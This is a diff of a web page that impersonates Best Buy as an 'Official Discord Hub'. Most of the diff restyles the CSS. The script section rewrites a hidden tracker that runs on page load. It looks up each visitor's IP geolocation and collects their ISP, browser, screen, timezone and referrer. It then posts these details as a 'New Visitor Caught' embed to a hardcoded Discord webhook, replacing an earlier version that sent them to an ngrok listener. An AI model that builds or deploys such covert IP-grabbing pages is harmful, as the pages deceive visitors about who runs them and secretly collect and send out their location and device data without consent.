@@ -5,19 +5,76 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Best Buy - Official Discord Hub</title>
     <style>
-        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #c8102e, #8b0000); margin: 0; padding: 0; color: white; overflow-x: hidden; }
-        header { text-align: center; padding: 40px 20px; background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); animation: fadeIn 1.5s ease-in-out; }
-        header img { width: 220px; filter: drop-shadow(0 0 15px rgba(255,255,255,0.6)); transition: transform 0.4s ease, filter 0.4s ease; }
-        header img:hover { transform: scale(1.15) rotate(5deg); filter: drop-shadow(0 0 25px #ff0000); }
-        h1 { margin: 10px 0; font-size: 3em; text-shadow: 0 0 20px #ff0000; animation: glow 3s infinite alternate; }
-        section { max-width: 1100px; margin: 30px auto; padding: 20px; background: rgba(255,255,255,0.08); border-radius: 15px; backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 10px 30px rgba(0,0,0,0.6); animation: slideUp 1.2s ease-out; transition: transform 0.5s ease, box-shadow 0.5s ease; }
-        section:hover { transform: translateY(-10px); box-shadow: 0 20px 50px rgba(200,16,46,0.5); }
-        .chart-container { height: 500px; width: 100%; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.4); }
-        p.nonsense { line-height: 1.8; font-size: 1.1em; opacity: 0; animation: fadeInText 2s ease forwards; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #c8102e, #8b0000);
+            margin: 0; padding: 0;
+            color: white;
+            overflow-x: hidden;
+        }
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        header img {
+            width: 220px;
+            filter: drop-shadow(0 0 15px rgba(255,255,255,0.6));
+            transition: transform 0.4s ease, filter 0.4s ease;
+        }
+        header img:hover {
+            transform: scale(1.15) rotate(5deg);
+            filter: drop-shadow(0 0 25px #ff0000);
+        }
+        h1 {
+            margin: 10px 0;
+            font-size: 3em;
+            text-shadow: 0 0 20px #ff0000;
+            animation: glow 3s infinite alternate;
+        }
+        section {
+            max-width: 1100px;
+            margin: 30px auto;
+            padding: 20px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 15px;
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.15);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            animation: slideUp 1.2s ease-out;
+            transition: transform 0.5s ease, box-shadow 0.5s ease;
+        }
+        section:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 50px rgba(200,16,46,0.5);
+        }
+        .chart-container {
+            height: 500px;
+            width: 100%;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+        }
+        p.nonsense {
+            line-height: 1.8;
+            font-size: 1.1em;
+            opacity: 0;
+            animation: fadeInText 2s ease forwards;
+        }
         p.nonsense:nth-child(1) { animation-delay: 0.6s; }
         p.nonsense:nth-child(2) { animation-delay: 1.1s; }
         p.nonsense:nth-child(3) { animation-delay: 1.6s; }
-        footer { text-align: center; padding: 20px; background: rgba(0,0,0,0.7); position: fixed; bottom: 0; width: 100%; font-size: 0.9em; }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0,0,0,0.7);
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            font-size: 0.9em;
+        }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes glow { from { text-shadow: 0 0 10px #ff0000; } to { text-shadow: 0 0 30px #ff0000, 0 0 50px #ff0000; } }
         @keyframes fadeInText { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
@@ -69,39 +126,55 @@
 </footer>
 
 <script>
-// Collect visitor data and send it to your ngrok-exposed Python listener
-async function sendInfo() {
+// ────────────────────────────────────────────────
+//   Sends visitor info to Discord webhook as embed (no-cors mode)
+// ────────────────────────────────────────────────
+async function sendToWebhook() {
     try {
-        const ipData = await (await fetch('https://ipapi.co/json/')).json();
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
 
-        const payload = {
-            ip: ipData.ip || 'unknown',
-            city: ipData.city || '?',
-            region: ipData.region || '?',
-            country: ipData.country_name || '?',
-            coords: ipData.latitude && ipData.longitude ? `${ipData.latitude}, ${ipData.longitude}` : 'N/A',
-            isp: ipData.org || 'unknown',
-            browser: navigator.userAgent || 'hidden',
-            time: new Date().toUTCString(),
-            referrer: document.referrer || 'direct'
+        if (!data.ip) return;
+
+        const embed = {
+            title: "New Visitor Caught",
+            color: 0xc8102e,
+            fields: [
+                { name: "IP", value: data.ip || "Unknown", inline: true },
+                { name: "Location", value: `${data.city || '?'} • ${data.region || '?'} • ${data.country_name || '?'}`, inline: true },
+                { name: "Coords", value: data.latitude && data.longitude ? `${data.latitude}, ${data.longitude}` : "N/A", inline: true },
+                { name: "ISP / Org", value: data.org || "Unknown", inline: false },
+                { name: "Browser / Device", value: navigator.userAgent || "Hidden", inline: false },
+                { name: "Screen", value: `${window.screen.width}×${window.screen.height} @ ${window.devicePixelRatio || 1}x`, inline: false },
+                { name: "Language", value: navigator.language || "Unknown", inline: true },
+                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown", inline: true },
+                { name: "Referrer", value: document.referrer || "Direct / Unknown", inline: false },
+                { name: "Timestamp", value: new Date().toUTCString(), inline: false }
+            ],
+            footer: { text: "Best Buy Discord Tracker • Hunter's eyes only" },
+            timestamp: new Date().toISOString()
         };
 
-        // CHANGE THIS LINE TO YOUR NGROK URL
-        await fetch('https://cors-anywhere.herokuapp.com/https://threatless-emotionable-joey.ngrok-free.dev/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+        // YOUR WEBHOOK HERE
+        const webhook = "https://discord.com/api/webhooks/1469122980478193726/7Sw4UgBa3pnSIenn2iG_CntO_6sQUMwgynMbsl6nZ3QpR8ZR3O6fb7Cq3v0qMOxiz6Yl";
+
+        await fetch(webhook, {
+            method: "POST",
+            mode: "no-cors",          // Skips preflight OPTIONS
+            cache: "no-cache",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
         });
 
-        console.log('Data sent to logger');
-    } catch(e) {
-        console.log('Send failed:', e.message);
+        console.log("Embed sent (no-cors mode - check Discord to confirm)");
+    } catch (err) {
+        console.error("Logging attempt failed:", err.message);
     }
 }
 
-// Fire automatically when page loads
-window.addEventListener('load', sendInfo);
+// Trigger on load
+window.addEventListener('load', sendToWebhook);
 </script>
+
 </body>
 </html>
-
